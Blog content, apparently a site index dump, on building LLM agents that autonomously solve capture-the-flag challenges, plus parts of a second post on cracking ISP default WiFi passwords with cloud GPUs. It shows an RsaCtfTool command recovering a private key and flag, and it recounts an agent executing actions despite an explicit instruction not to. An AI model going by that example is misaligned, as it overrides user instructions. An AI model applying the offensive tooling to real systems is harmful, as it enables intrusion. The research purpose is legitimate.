will likely adapt and become more and more challenging as you’re now expected to leverage LLMs to help solve challenges. Exploit path will likely be longer or more convoluted.\nWhile everyone adapts to this change, I’m sure a lot of CTFs are going to experience unexpectedly large number of challenge solves as people leverage LLMs more and more. It’ll make for great drama on twitter with people confusing it for flag sharing and what not:\nref: https://x.com/terjanq/status/1965037146504647038 Note: I played in this CTF and know for a fact that GPT-5 Thinking was one-shotting a lot of these…\nFuture research and tool improvements Performing this research has given me a number of ideas on what to improve in future iterations. I’ve added a starter list below which I hope to explore in follow up research:\nFinetuning models Data generation Synthetic dataset using OpenAI GPT-5 (or equivalent model) and a testing environment that validates the outputs and tools used Using solves but removing intermediate steps which failed to identify optimised solves Finetuning for agentic use RL https://github.com/OpenPipe/ART https://www.youtube.com/watch?v=gEDl9C8s_-4 Finetuning a single agent instead of 3 separate agents - https://arxiv.org/abs/2509.06283 Tool use Finetuning for tool use, python or bash commands Fine tuning on kali linux commands Fine tuning on better code search tools like ast-grep and other tools like strangerstrings Trial fine-tuning using Lora, Qlora, etc… Finetuning a reasoning model vs direct response model Agents / Context engineering Adding a Deep Research Agent to search for tools, CVEs, topic knowledge and what not which may help provide more context and lead the agent to solving the challenge Add an image parsing tool/agent to help describe, extract data or solve challenges which require looking at an image (ie. moondream 2B vision model, GLM-4.5V, etc) Text recognition using https://github.com/open-mmlab/mmocr?tab=readme-ov-file , https://github.com/PaddlePaddle/PaddleOCR or tesseract Add new tools like IDA/Ghidra MCP for reversing and pwn challenges and burpsuite or equivalent for Web challenges Using specialised coding agents to analyse code for example during web or crypto challenges (ie. qwen coder, etc) Test out and explore direct tool use instead of single step querying as is currently done Explore specialised agents per task type RAG adding synthetic RAG, providing RAG based on the step (planning, thought, action) self-learning mode - automatic RAG addition based on tools/commands that work well test out other RAG solutions like weaviate or postgres vector hybrid RAG retrieval https://www.sciencedirect.com/science/article/pii/S1474034625001053 Using Weaviate: https://ragaboutit.com/how-to-build-a-hybrid-rag-system-with-weaviates-new-multi-vector-search-the-complete-implementation-guide/ Prompt engineering Test out prompt optimisation manually and using frameworks like dspy Test different system templates - not all models respond to same message templates, adjust for each Benchmarks / Training data Adding an Improved Jupyter notebook to allow periodic saving of Task and Benchmarks for future comparisons Add more challenges to train and benchmark against keep all traces and use them for learning / improving models remove non-working steps (ie. command not found, etc) use traces to improve RAG or teach new models Other Using a less bloated environment (ie. Kali is too bloated) Adding a web UI to view output and with the ability to talk to the agent(s) and provide additional context and ideas Testing with locally ran and parameters optimised by models LLM Cache (eg. https://github.com/LMCache/LMCache) - Not really useful for personal use agents but interested in trying it out ","developing-a-more-robust-agentic-solution-to-solve-ctf-challenges#Developing a more robust Agentic solution to solve CTF challenges":"After attempting to refactor the Palisade/intercode’s code twice (using GPT-5 codexand manually), I gave up and decided to rewrite everything from scratch. Too much of the code was useless or redundant (the original intercode research looked at more than just CTFs so more code was needed), prompts were stored everywhere and hard to manage. It was difficult to adapt new strategies and rework it, so instead I design an improved system and wrote it from scratch.\nI will say that Palisade/intercode were only exploring different techniques for research purposes and had no intention of actually using the agents outside of benchmarks which is why they might put less time into designing a more robust and more versatile system that can be used for benchmarks as well as standalone tasks (ie. used during CTF events).\nPalisade’s research showed improved solve rates using prompting techniques and agent loops such as the ones we discussed earlier (eg. Chain-of-Thought, Plan, React, React-Plan). They had developed the following 5 strategies:\nN-turns: this strategy is basically using Chain-of-Thought. The model is given the initial task and asked to perform 1 step each time for N number of turns. Each turn the agent is provided with the previous actions (ie. bash or python commands) performed and the action output (ie. stdout/stderr). The agent continues until it runs out of available turns or it solves the challenge. We’ll call this agent the ActionAgent. Plan: this strategy is similar except that there is a secondary agent which provides a plan on how to solve the challenge. This plan is given to the ActionAgent in an attempt to help it solve the task. We’ll call this secondary agent, the PlanningAgent. ReAct: this strategy involves two (2) steps. The first step is to ask an agent (ie. ThinkingAgent) to generate a thought about how to solve the next step, forcing the agent to think about reasoning steps before converting its reasoning to an action using the ActionAgent. ReAct+plan: this is basically the same as the ReAct strategy except also request a plan from the PlanningAgent and give that plan to the ThinkingAgent. This is the strategy that yielded the best results in their testing. Tree-of-Thoughts (ToT): this last strategy uses Tree-of-Thoughts which is another prompting strategy which I will explore in a future blogpost. From the strategies above you might have spotted a common theme, basically the ActionAgent, ThinkingAgent and PlanningAgent can be combined and interchanged to make up 4 of the 5 strategies. Combining them as such makes the code (and strategies) more modular as you can interchange them, and/or add new agents with new abilities. For example, a Vision Agent to extract information from images and videos or a DeepSearch agent to search for information and resources on a specific topic (or PoC/CVEs) when we’re stuck on a challenge. This is why I decided to refactor them as such. It also makes it easier to manage the system and user prompts as they’re basically always the same regardless of the strategy.\nWith the modifications added and the cleaned up prompts you can see each agent here:\nActionAgent PlanningAgent ThinkingAgent The ThinkingAgent seems quite redundant for reasoning enabled models as they already have their own thinking. It might be more helpful for non-reasoning agents as it provides them the ability to reason before giving an action command. It would be interesting to test different setups in the future with and without the ThinkingAgent thoughts as I speculate that it might not provide much value except giving the agent an additional step/attempt to solve challenges. With the improved response format, the models are also asked to provide an explanation of their action which basically describes the thought behind their command and I believe could replace the “thought” from the thinking agent:\nI have kept the ThinkingAgent for now as I test out different setups (and since I wanted to be able to replicate the previous study) and check if this step is needed or not. I also believe that with finetuning, a single agent setup might be able to replace the PlanningAgent and ActionAgent setup with a single agent that does everything and chooses when to make a plan vs tries to run a command.\nIn addition to separating each agent, I’ve also added a response format for each agent which provides structured responses and allows better context management when building the query (ie. when providing the thoughts or plan to the action model). Here’s a before and after adding a response format to the PlanningAgent, you can see the unstructured nature of the first response which would have been simply appended to our query and might cause confusion while the second version is more structured and allows us to test different version by providing more or less information to the ActionAgent (eg. providing suggested tools):\nRunning benchmarks is nice but all you get is number go up… What if we actually want to use our Agent during a CTF? For that reason, I added a Jupyter notebook with boilerplate code to download and setup a new Task (aka a challenge) and give it to the Agent to solve. Here’s an example where I’m using it to solve a networking challenge from 247ctf.com:\nIt took its sweet time but got there in the end… There’s still lots of improvements possible, especially around providing help with how to use certain tools but it was stubborn enough and managed to complete it! There’s a few ideas we could leverage here like attempting to learn from our solve by looking at the shortest solve path based on the commands we ran and saving those commands for later use. We’ll see how we can incorporate some of that in the RAG section below.\nIn addition to the changes above, here’s a non-exhaustive list of additional features and improvements made:\nCode refactored for modularity, removing all unused code and combining as much as possible\nEnvironment upgrades\nAdded missing tools and created symlinks to help with models attempting to use tools in different manners (eg. RsaCTFTool.py instead of RsaCTFTool) Each new run is performed in its own container environment meaning you can do multiple instances at once in different terminals The challenges are copied during the task itself and not during container creation which makes it easier to test out new challenges and cleanup environments Improved container deletion once benchmark/task has completed. Usability \u0026 Reliability improvements\nAdded a Jupyter notebook with a single task solver to use during CTFs Added a shell script to run OpenRouter agents Added a number of checks and conditional retries with exponential back-off to prevent issues with inference servers Fixed a number of bugs, errors and added soft-fails where possible Added multi-threading for benchmarks so you don’t have to wait hours for it to be completed Observability and Operations\nAdded the ability to setup Langfuse to help with LLM Observability (see Observability and Operations section for more information) Agents\nCleaned up agent prompts and added context to improve task solve speed, solve rate and solve consistency Removed prompt sections like “I’ll tip you 100 dollars”. While this worked great some time ago, this is usually no longer required. Centralised Prompts Added additional context such as flag format, provided files, URLs and challenge category. Added ResponseFormats to Planning and Thinking agents who didn’t have a specific response format Added RAG (See Retrieval Augmented Generation (RAG) for more details) Added arguments to vary the planning strategy based on either static number of steps or every X step. Logging\nCleaned up the log file naming convention to prevent overwriting runs Added better logging overall and storing more information like start-time, end-time for tasks, runs, etc Missing features from previous research:\nCurrently does not support ToT strategy, however I will add this in the future. For a list of planned improvements, see the Future research and tool improvements Section.\nBenchmark comparison post-rewrite To ensure I hadn’t created a worse setup, I decided to run the benchmark again on models tested previously. The results are on-par with Palisade’s research except with improvements on reliability (ie. gpt-oss-120b jumped from 9 to 75 challenges solved).\nThe updated table can be seen below. Its not cheap to run these and takes a while so I only re-ran a few of them which would give a good idea where we stand:\nmodel # of parameters Thinking? # of solves (old) # of solves (new) delta logfile deepseek-ai/DeepSeek-V3.1 685B True 80 79 -1* log ByteDance-Seed/Seed-OSS-36B-Instruct 36B True 79 78 -1* log openai/gpt-oss-120b 120B True 9 75 +66 log moonshotai/Kimi-K2-Instruct-0905 1T False 77 N/A N/A N/A Qwen/Qwen3-Next-80B-A3B-Instruct 80B False 80 69 -11* log Qwen/Qwen3-Next-80B-A3B-Thinking 80B True 26 N/A N/A N/A meta-llama/Llama-3.3-70B-Instruct 70B False 4 N/A N/A N/A mistralai/Mistral-Nemo-Instruct-2407 12B False 2 33 +31 log meta-llama/Llama-3.1-8B-Instruct 8B False 0 N/A N/A N/A *The large negative deltas for Qwen/Qwen3-Next-80B-A3B-Instructare due to inference provider errors and internet connection cuts. These benchmarks are expensive to run so I’m not going to run these again and will assume that they are negligible for now. I also only did 1 pass through and 2 attempts for each task instead of the usual 3 attempts per task.\nThe -1 delta discrepancy for models DeepSeek and Seed-OSS models is due to less steps allowed (ie. 25 instead of 30) and less attempts (ie. 2 instead of 3) than the previous benchmark. Hence, I’ll consider these on-par. The biggest improvement can be seen with models that previously had very low score in the baseline due to a number of issues (ie. response formatting, poor error handling, bugs, etc). This shows that we’ve managed to improve consistency and robustness quite a bit, allowing smaller models such as Mistral Nemo to perform significantly better while only being 12B tokens in size.\nNote\nAnother issue I discovered later on is that some inference providers on openrouter are garbage and will continuously return empty responses (which explains the previous low results for some of the models (eg. gpt-oss-120b, llama 3.3 70B). If you keep on getting issues with certain models, it might be worth looking at your activity page (https://openrouter.ai/activity?page=1) and ignoring those providers in your account settings (https://openrouter.ai/settings/preferences)\nRetrieval Augmented Generation (RAG) There exists a tool called RsaCtfToolwhich basically tries a number of insecure RSA primitives to recover a private key and use that private key to decrypt encrypted text (ie. ciphertext). In their research, Palisade modified the prompt to mention that we have access to the tool, installed the tool in the environment and added it next to the challenges which might require it :\nThey also provide an example in one of their prompts:\nThis tells the model the tool exists, helps it learn about the tool and how to use it. While this is not being retrieved dynamically, if we were able to retrieve tools based on the current task, we could list a lot more tools that might help the agent solve the task. This is where RAG comes in. RAG enables us to retrieve tools and information at runtime based on current task and the theories we have to solve the challenge.\nLets look at examples of how that can improve our agents.\nEnhancing capabilities by introducing tools: RsaCTFTool for crypto challenges One of the challenges in the picoCTF benchmark can be solved entirely using RsaCTFTool. The problem is if the models are not aware the tool exists or don’t know how to use the tool properly they will try to solve the tool manually which may work but is very inefficient.\nThe challenge is a crypto challenge that tries to teach you about RSA implementation weakness, specifically using non-prime number for N which can be factorised relatively easily:\nThe quickest way to solve this challenge is to use RsaCtfTool to search a online database of factors (ie. factordb.com) and factorise N. This allows us to recover the private key:\nRsaCtfTool also has a way to decrypt ciphertext directly which mean with one command you can basically solve the challenge:\n$ RsaCtfTool -n 1422450808944701344261903748621562998784243662042303391362692043823716783771691667 -e 65537 --decrypt 843044897663847841476319711639772861390329326681532977209935413827620909782846667 --attack factordb --private ['/tmp/tmpkbo3txdj'] [*] Testing key /tmp/tmpkbo3txdj. [*] Performing factordb attack on /tmp/tmpkbo3txdj. [*] Attack success with factordb method ! Results for /tmp/tmpkbo3txdj: Private key : -----BEGIN RSA PRIVATE KEY----- MIGwAgEAAiIv/IZi84fX6oy8X46Nkz8/hpvqZIr+AVHktXPVdOmciSqTAgMBAAEC IiDlTT8CUaqryOTN4Qye16nwq1dq9EdZ7q2VP9DPJWALAaECEQZY9sOHJWE7+0FH 2V+wZK0DAhIHj1QAU1FI0d/1sfIrHodVrzECEQP5H8zYBT/NycHc9WV+BiZ9AhE9 KENmXqA1eaVS/TsdmNs9UQIRAPFen0CtiPHZkuODgHqHqRA= -----END RSA PRIVATE KEY----- Decrypted data : HEX : 0x007069636f4354467b736d6131315f4e5f6e305f67306f645f30303236343537307d INT (big endian) : 13016382529449106065927291425342535437996222135352905256639555294957886055592061 INT (little endian) : 3710929847087427876431838308943291274263296323136963202115989746100135819907526656 utf-8 : picoCTF{sma11_N_n0_g0od_00264570} utf-16 : 瀀捩䍯䙔獻慭ㄱ也湟弰で摯た㈰㐶㜵細 STR : b'\\x00picoCTF{sma11_N_n0_g0od_00264570}' If we look at how the model attempts to solve the task when it doesn’t know about RsaCtfTool, we can see it understands what it needs to do but tries to do it manually and factorise locally which could take a while, if even possible on a laptop. You can see the PlanningAgent’s response where its trying to use python to do it manually:\nAnd the action models does as suggested using python:\nWe’ll now teach the Agent about the tool itself by adding the tool, its utility and some examples in the system prompt as such:\nAfter providing tools and example commands, the agent has learned about the tool and how to use it and is able to solve the challenge within the least amount of steps (we can’t solve any faster then this). Here’s the plan returned after the tool information was added to the system prompt which now contains references to RsaCtfTool:\nAnd the list of actions is now very direct, the ActionAgent also realised that it could do step 2 and 3 of the plan at the same time using 1 command and went for it:\nHence we can teach agents to use new tools available to them.\nReducing step count by giving command examples: recursive binwalk Introducing new tools is great but we can also leverage this new ability to teach the model about how to use effective tools efficiently. Here you can see the model attempting a different challenge where it has to run a set of commands recursively until it gets to the flag:\nThe model is not aware that binwalk the first tool it uses has a way to run recursively which we can try to teach it:\nAfter updating our system prompt we can see that the agent is now much more efficient, although its still not that great at navigating directories recursively:\nBy adding an example to our tool, we can teach it to be more efficient after extracting files:\nWith this new example, it decided to use the first example but then took ideas from the second example to find all files instead of recursively looking inside of each directory:\nWhy are there two cat commands? This is the output from the first cat command: p�i�c�o�C�T�F�{�4�f�1�1�0�4�8�e�8�3�f�f�c�7�d�3�4�2�a�1�5�b�d�2�3�0�9�b�4�7�d�e�}\nExplanation from the LLM itself: The observation from cat flag.txt shows the flag characters separated by null bytes (visible as blank boxes). To get the clean flag, we need to remove these null bytes using tr -d '\\0'\nAdding RAG to our Agent system We’ve just shown that its possible to improve capabilities by adding tools and examples to system prompts. Since my current list of tools is small I could technically just extend the system or user prompt with the tool list and examples. However, as the list of tools expands this won’t be manageable.\nAs such, we need to be able to only provide the tools needed for the task at hand. This is where RAG comes in!\nThe hard part with RAG is knowing what data to add to your context and when to add it. For this solution, I’ve decided to use multiple steps to figure out which commands and tools might be useful for the task. These tools and commands are stored in a database which are essentially json files. Here’s an example for the binwalk tool which has some lesser known arguments like -M to extract recursively:\n{ \"title\": \"binwalk\", \"explanation\": \"Binwalk can identify and extract files and data that have been embedded inside of other files. Its primary focus is firmware analysis, it supports a wide variety of file and data types. Through entropy analysis, it can even help to identify unknown compression or encryption.\", \"examples\": [ { \"query\": \"Recursively scan extracted (-e) files and data like matryoshka dolls (-M)\", \"command\":\"binwalk -eM \u003cfile.ext\u003e\" }, { \"query\": \"Recursively scan extracted (-e) files and data like matryoshka dolls (-M) plus print all extracted files\", \"command\": \"binwalk -e -M dolls.jpg \u0026\u0026 find . -type f\" } ], \"categories\": [ \"reversing\", \"forensic\" ], \"tags\": [ \"reversing\", \"forensic\" ] } First, the planning agent receives a list of tools and descriptions based on the task’s categories. Using these tools, it generates a plan and might include the tools in their tool suggestions. There are no examples, just a list of tools that match the challenge’s category:\nIn its plan, the agent returns a list of suggested tools which might include some of the tools we retrieved from our database:\nNow we want to convert the planning agent’s output to search for related tools and get relevant examples in order to provide this information to the thinking/action agents. We do that by using a hybrid RAG setup. We find the most relevant tools to add by calculating a score using a number of methods:\nBM25: basically a ranking algorithm that determines relevance based on keyword matching and word frequency in documents (ie. keyword matching) Semantic Search: Semantic search is all about understanding meaning and context instead of just word matching. This type of search focuses on understanding the intent behind the words in a query. Basically, we use an LLM to try and extract meaning from a query so that a query like “my laptop dies overnight while sleeping” does not end up with the agent trying to call the cops on you but instead find something like “Troubleshooting standby power drain and unexpected battery loss during sleep mode.”. Keyword Bonus: We have the luxury of having specific keywords that are more important than others. I’m talking about the tools/commands specifically (eg. binwalk). This means we can use it to boost entries that are about this tool specifically. This prevents the tool being buried if the query ran matches other commands more than this tool itself. We generate a score for both BM25 and Semantic Search which we combine (using Reciprocal Rank Fusion) and then add the Keyword Bonus, mathematically this looks something like this:\nscore = RRF(BM25(query),SS(query)) + KB(suggested_tools, card_tools) where query -\u003e task_summary provided by the planning agent suggested_tools -\u003e a list of suggested_tools provided by the planning agent card_tools -\u003e a list of cards and associated tools for each card RRF -\u003e Reciprocal Rank Fusion BM25 -\u003e lexical search using Best Matching (ie. BM25) SS -\u003e Semantic Search KB -\u003e Keyword Bonus Using this score, we rank the documents (ie. tool cards) and use a reranker which is a type of model that given a query and a set of documents will output a similarity score. We use this similarity score to reorder the tool cards by relevance to our query and finally we remove all cards below a minimum score as they are probably not relevant (used a min score of 0 while testing). This aims to provide the most relevant tools for the task at hand and hopefully helps us solve harder challenges (ie.RsaCTFTool example) or solve challenges faster/more efficiently (ie. binwalk example).\nTo show this works, we can attempt challenges 12 and 14 again (ie. the binwalk and rsactftool challenges) from before and see the improvement with and without RAG.\nWithout RAG, its trying python shenanigans hoping it can factorise it on this limited docker container inside of my limited VM on this old laptop which it’ll struggle with and timeouts before anything interesting happens. We can see the model does have limited knowledge of rsactftool and attempts to use it but fails miserably because it doesn’t know how to use it properly:\nSimilarly for the “binwalk” challenge, it uses the slow method of extraction, repeatedly calling binwalk, unzip, and dd:\nWith RAG, it solves both challenges in the smallest amount of possible steps using the tools exactly as we’ve provided them with in our RAG solution:\nYou can find both log traces here:\nWith RAG Without RAG This shows we can successfully leverage RAG to augment our agents and solve challenges that it might not have solved on its own.\nLimitations of RAG RAG is great when it provides the context required for a certain task but finding the right context (in our case the right tool(s)) and ensuring that we don’t poison the context with garbage data that is not useful for the task at hand is much more difficult.\nThere are also a number of limitations that have possible solutions which I will explore in the future:\nThe context window is not unlimited: At the moment, its easy because we have a low amount of tools but when more tools are added, we might need more tools and tool examples and the context grow quickly Our current setup relies on the Planning Agent’s query which might not be accurate and might not match the correct tool(s). For example, challenge descriptions can be cryptic so when the planning agent attempts to solve them at first, it might not have enough information about the task at hand and end up suggesting completely incorrect tools. An idea could be to try and retrieve the tool cards later on and not just for the planning agent. It’s hard to keep the wiki up to date: At the moment, the RAG wiki only has 4 tool cards, namely binwalk, mergecap, rsactftool, ssldump. However, there’s a lot more tools that would be great to add in there but its hard to manage manually. What would be interesting is to use past/future solves and extract the set of commands required to solve the challenge and add them to our wiki automatically. When to add RAG context: The RAG context is only added when the planning agent is called (which might not always be the case). I need to find a better solution on when to add context vs when not to. Ambiguous tools: Some tools might be universal and not just relevant to crypto challenges for example and therefore would not be shown to the planning agent in our current setup. We might need to rethink how we list the tools relevant for the task when querying the planning agent in order to pull tools from categories other than the challenge’s category. For example, we could try a similar thing as we do with the other agents and use the category as a bonus keyword when we’re querying the cards for the planning agent. Lastly, we could look into finetuning to embed the information directly into an LLM.\nRAG vs Finetuning RAG is when you want to bring to the LLM specific information. Fine tuning is when you want that knowledge set to be part of the system. ~ Xtianus21 (reddit)\nRAG can help with giving knowledge of tools and concepts to LLMs by providing it within prompts and queries. The problem is it won’t improve the model’s task prioritisation and execution flow. For example, here the model knows about a few steps used to solve the task but instead of running one command at a time and checking it executed as expected its trying to perform all steps at once which is very error prone:\nDuring testing, certain models had issues with tshark command and its various flags, filters, etc so it had to run similar commands quite a few times. It also failed to understand that it would be easier to run mergecap first and only once instead of running it on every command:\nI will explore finetuning in a future article to see if it can help with solving these issues.","making-a-simple-interactive-tui-agent#Making a simple interactive TUI Agent":"Enough theory, lets get into the interesting stuff now and actually make an Agent and solve some CTF challenges.\nMy first iteration involved making a Terminal UI (TUI) Agent which supported tools that I could provide to the agent and chat with the agent directly and see the progress. I also wanted to have the ability to save each chat trace including tool calls and display it as a webpage so that I could see what tools were being called, the agent’s thought process, my user input, etc… You can view the code here (mostly vibe coded with codex).\nTo test the agent, I was using a CTF challenge from the awesome platform 247ctf.com. The platform has a variety of challenges and is a great way to learn about new and interesting hacking topics. One of the challenges I was able to solved using the Agent was a web challenge called Compare the pair:\nThis challenge involves bypassing a weak authentication check in order to retrieve a flag (I’m not going to spoil the solution in case someone wants to try it, otherwise you can just read the Agent’s chat trace below):\nHere is the prompt I used which resulted in the Agent solving the challenge. Notice that I explicitly asked to not execute any actions and make a plan instead but it decided otherwise and was able to solve the challenge:\nYou are a ctf player, using the tools at your disposal solve the challenge. Request the challenge first and then make a plan of action. DO NOT EXECUTE any of the actions yet! When bruteforcing you can bruteforce up to the following number: 999999999. The challenge is: url: https://55affb983512588f.247ctf.com/ Can you identify a way to bypass our login logic? MD5 is supposed to be a one-way function right?. My first attempt was quick and dirty and ran commands in my virtual machine. It didn’t take long for models to start downloading and installing random tools… I learned my lesson quickly and move on to using a separate docker environment. You can find the docker contained MCP server I modified here.\nIt was great to test out various tools and play around with writing better prompts. However, it required a lot of babysitting and re-prompting. After playing with it for a while, I wanted to move on to something more automated that leveraged more advanced techniques and hopefully had a better chance at solving challenges. More specifically, I wanted to use context engineering techniques and see if I could an automated agent able to solve advanced problems more consistently.","observability-and-operations#Observability and Operations":" LLM observability is the practice of gaining comprehensive, real-time visibility into the behavior, performance, and output characteristics of large language models (LLMs) and their associated applications in production. It goes beyond simple monitoring by providing the ability to understand the internal states of an LLM system through its outputs, enabling teams to debug issues, optimize performance, and ensure reliability, safety, and efficiency. This is achieved by collecting and correlating telemetry data such as logs, metrics, and traces from the application, APIs, and workflows.\nObservability tools allow you to see chat traces without having to print them in logs or terminal outputs and provide a platform to improve Agents through dataset benchmarking/evaluation, prompt management, and more. For my use case, I only wanted to be able to log LLM chats, search them easily and identify any shortcomings or improvements that could be made to the CTF Agent I created. As such I decided on using Langfuse, an open source observability tool and one of the many available out there. The thing that sold me was the clean UI, ability to self-host and the simplicity with which you can integrate it into your applications to start logging chat traces.\nIn your Python application, replace the openai import with the langfuse equivalent\n# import openai from langfuse.openai import openai Export the required environment variables and simply run your python agent:\nexport LANGFUSE_SECRET_KEY=sk-lf-....-2300a4e4dea2 export LANGFUSE_PUBLIC_KEY=pk-lf-....-dd2171f8d0a7 export LANGFUSE_HOST=\"http://localhost:3000\" python3 agent.py That’s it… That’s all you need to get basic traces logged in Langfuse! I mostly used the Observability feature which provided LLM chat/session tracing so I can identify any issues or improvements. I will explore other features in the future. You can see some examples below:\nIt’s a great way to see if something is wrong, for example here I’m failing to provide a turn history:","reviewing-previous-research#Reviewing previous research":"While researching the topic, I came across a multiple articles using benchmarks to test LLM and Agentic capabilities for solving CTF challenges. One of the newer articles on the topic comes from PalisadeResearch and showcased a comparison of different prompting techniques leveraged to solve a set of challenges from the picoCTF competition. picoCTF is an entry-level competition so the challenges themselves are not difficult but they teach a number of techniques that are required to know and solve harder challenges. Hence, getting a baseline on these challenges is a great way to ensure LLMs and Agents might be capable of solving harder challenges.\nPalisadeResearch has made their code available which makes it easy to test out and build upon.\nAs my goal is to use open-source models, I wanted to get a baseline comparaison of their current capabilities using PalisadeResearch’s code before moving on. Only small modifications were made to allow using OpenRouter as an inference provider instead of OpenAI. I’ve uploaded the diff of changes here for transparency.\nNote: I have not modified the code, prompts, environment or Agentic behaviour in order to keep a better baseline comparison. I understand that this code is made to compare different configurations but is not robust enough to be used in a production environment and does not handle agents misbehaving, not following response formats, etc. I’ve remade the application from scratch to better handle such cases which I’ll showcase in the next section.\nI decided to use the following open-source models (logs can be found here):\nmodel # of parameters Thinking? # of solves deepseek-ai/DeepSeek-V3.1 685B True 80 ByteDance-Seed/Seed-OSS-36B-Instruct 36B True 79** openai/gpt-oss-120b 120B True 9* moonshotai/Kimi-K2-Instruct-0905 1T False 77 Qwen/Qwen3-Next-80B-A3B-Instruct 80B False 80*** Qwen/Qwen3-Next-80B-A3B-Thinking 80B True 26*** meta-llama/Llama-3.3-70B-Instruct 70B False 4* mistralai/Mistral-Nemo-Instruct-2407 12B False 2* meta-llama/Llama-3.1-8B-Instruct 8B False 0* * : Some models error’ed before completing the benchmark due to a number of issues (eg. not following response_format, running out of context space, inference provider issues, etc). Since my goal also involves making the Agent more robust, I am not going to try solving every error encountered yet and will use these tests as a baseline instead. I test a bunch of other models too but smaller models were very inconsistent with set response formats.\n**: The first run of the ByteDance-Seed/Seed-OSS-36B-Instruct model failed due to provider issues (only 3 challenges were solved). However I wanted to get a better baseline as I decided to use this most for most of my testing later on. As such, I re-ran it a second time to get a more complete baseline.\n***The two Qwen3-Next-80B-A3B models were released as I was about to release this blog. After testing them, they showed good results and seemed promising. The instruct (non-reasoning) model was also quite quick compared to some of the other models so I decided to test them out and use them in this research.\nThe fact that an open-source 80B parameters model matched a 685B model and was on par with strong closed source models is very promising. Furthermore, the ability of newer models such as DeepSeek-V3.1, Seed-OSS-36B and Qwen3-Next-80B-A3B to follow instructions and consistently provide accurate response formats has been quite impressive. Since I wanted to focus my research on smaller models, I decided to focus on one reasoning model (ByteDance-Seed/Seed-OSS-36B-Instruct) and one non-reasoning model (Qwen3-Next-80B-A3B).\nThis benchmark only compares solve rates, however since the newer models basically solve the same number of challenges, to be more thorough we should look at more than simply the number of solves. For example, solve speed and number of steps to solve could be taken into account to compare the different models. We’ll look at optimising these in the RAG section of this article.\nFurthermore, these models have more training, better quality data and benchmark data contamination might be an issue so it’ll be important to test them against other challenges/benchmarks.","testing-improvements-in-a-live-ctf#Testing improvements in a live CTF":"Before I test the Agent in an actual live CTF environment, I needed it to have a hacker alias, and decided to let our LLM overloards choose. Here’s what GPT-5 came up with:\nI also asked it for a Country and Team Name as some CTFs require that information:\nUsername: rop_n_roll Country: Estonia Team Name: Baltic Bitflip So if you see a player named rop_n_roll from Estonia part of the Baltic Bitflip Team competing in your CTF event, you might be playing against a bot.\nUnfortunately, I only had time to test a single challenge due to IRL commitments, however rop_n_roll battled through and was able to solve that it:\nGreat success!","testing-improvements-on-a-new-benchmark#Testing improvements on a new benchmark":"Why do we even need a new benchmark? Large Language Model (LLM) benchmarks provide consistent, reproducible ways to assess and rank how well different LLMs handle specific tasks. They allow for an “apples-to-apples” comparison—like grading all students in a class on the same tests. Limitations of LLM benchmarks include potential data contamination, where models are trained on the same data they’re later tested on, narrow focus, and loss of relevance over time as model capabilities surpass benchmarks.\nBenchmarks are nice but as LLMs get better and are trained with more data, a lot of benchmark data is also fed into LLMs which allows them to solve that specific benchmark but their abilities might not transfer to other benchmarks. It is said that some models are also directly trained on benchmark data in order to achieve better results for said benchmarks. This is called benchmaxing.\npicoCTF is very well know and there is a plethora of write-ups available online. This means that the updated models Palisade have used (ie. OpenAI models) are likely to have direct solves for each of the challenges in their training data.\nFurthermore, one of other the issues I have with Palisade’s research is that for Crypto RSA challenges, they explicitly put the RsaCTFTool inside the challenge folder as can be seen on challenge 12 and challenge 79:\nThis is basically a huge hint for the challenge itself. The model will most likely run ls -al to list the files in the directory and will see that there is the challenge as well as the RsaCTFTool in there and therefore attempt to use the tool to solve the challenge. The original research did not provide the tool with the challenge itself. I feel like that is a big hint to give to the LLM as CTF challenges usually don’t include tools with challenges but instead require the user to identify fitting tools for the challenge.\nThey also mention that the tool is available within one of their system prompts although that is considered context engineering which in my opinion is fine:\nNevertheless, since there is only one tool listed it seems very “optimised” for the benchmark itself. Additional tools or a RAG integration would have been more impressive.\nRegardless, I’m not here to trash on their research, I just want to highlight some of them reasons why I believe we need more benchmarks.\nCreating a new benchmarks Creating a new CTF benchmark is quite simple considering the amount of open source challenges and CTF archives on Github, ctftime.org, and the web.\nAs a test run, I decided to create simple benchmark using a total of 27 CTF challenges in varying difficulty. A lot of these challenges are quite a bit harder then the picoCTF challenges, however I know for a fact that a number of these can be solved with LLMs since I was able to solve a few using GPT-5 Thinking directly within OpenAI’s chat interface (ie. no access to Kali environment).\nThe benchmark, which I’ve named The Unfinished CTF Benchmark, is comprised of the following 27 challenges of varying difficulty, split in five different categories:\nCategory # of challenges Miscellaneous 4 Cryptography 5 Networking 7 Reversing 10 Web 1 Note: I’ve decided not to release the benchmark as some of the challenges may still be active and I’m still adding new challenges to it. I may or may not release a curated benchmark in the future… Only time will tell!\nComparing Agents on the new benchmark // TBD - comparison in progress"},"title":"Exploring Autonomous LLM Agents for Capture The Flag problem solving using Prompt Engineering, RAG and Open Source LLMs"},"/articles/isp-default-wifi-passwords-are-costlier-to-keep-than-to-crack-value-optimised-cloud-gpu-password-cracking/":{"data":{"":"This article won’t tell you how bad the Canadian Internet Service Providers (ISP) oligopoly is, there’s already posts ranging from 2008 to 2024 to tell you all about that! Instead, I’ll focus on their poor default WiFi password standards. I’m mentioning Canadian ISPs as an example here but so many ISPs and router manufacturers decide to set worse default passwords then your 3 year old toddler…\nI’m not going to name any ISPs directly because I don’t want to annoy anyone and I’m just writing this for education purposes. I will use fictional password patterns that may or may not resemble real ISP default WiFi Passwords.","conclusion#Conclusion":"There’s two parts to this blog which deserve their own conclusion.\nISPs and router providers need to up their game when it comes to setting default passwords. The password templates they use are really weak and a determined attacker will crack your WiFi with less than a year’s worth of service in computing power. Furthermore, the rise of AI has boosted the GPU rental market tremendously and people have flooded the market with ever cheaper GPUs. This brings us to our second conclusion.\nIts important to test your tools and compare offerings if you want to find the most valuable opportunity out there. There’s already plenty of hashcat benchmarks online you can assess to find the best GPU for the hash mode you are targeting. Compare those cracking speeds with the GPU offerings and you’ll find the best value offerings. The cheapest GPU is not always the best! I’ve decided not to release any tools yet as I’m still building out functionality for those but I intend on release something in the near future which should automate. Stay tuned!\nFinally, remember to always change those pesky default passwords to something safe and secure. Regardless of your password, I would also not recommend using the default router provided by your ISP. These are usually cheap as they are mass manufactured, potentially more likely to have vulnerabilities and usually have a functionality for ISPs to be able to access remotely (aka built-in backdoor)… If you’re serious about security, it might be time to use your own router. You can change the MAC address to match the router they provided so they don’t get annoyed.\nTest your tools, secure your stuff and stay safe out there.\nImprovements and future research ideas Better benchmarking database using benchmarks found online and application/tool to periodically identify the best value offering based on benchmarks and rental price Using LLMs to search and scrape images for WiFi credentials and MAC addresses, store those in a database and generate SSID/password patterns per router/ISP type 